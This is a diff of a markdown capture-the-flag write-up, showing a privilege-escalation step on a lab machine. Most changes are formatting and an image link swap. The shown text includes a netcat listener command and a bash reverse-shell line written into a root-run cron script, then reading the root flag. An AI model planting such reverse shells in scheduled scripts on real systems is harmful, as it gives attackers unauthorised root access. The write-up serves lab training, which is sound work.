@@ -493,26 +493,40 @@ After a lot of research we found a script called .mysecretcronjob.sh at path /va
 <br>
 <br>
 Before edit  start a listener to your machine: 
+
 <br>
+
 📜 Command : nc -lvnp 1234 
+
 <br>
+
 <br>
+
 Lets edit it : 
-📜 Command : nano .mysecretcronjob.sh
 <br>
+📜 Command : nano .mysecretcronjob.sh
+
+<br>
+
 And write inside the shell : 
+<br>
 📜 Command : bash -i >& /dev/tcp/YOUR_IP/1234 0>&1
 
 <br>
 <br>
-After some minutes we got the connection ... 
+After some minutes we got the connection ...
+
 <br>
 <br>
-![root](https://i.imgur.com/InBoqJ7.png)
+
+![root](https://i.imgur.com/g7GbjIN.png)
+
 <br>
 <br>
-then :
+Then :
+<br>
 1. cd /root
+<br>
 2. cat .root.txt
 
  
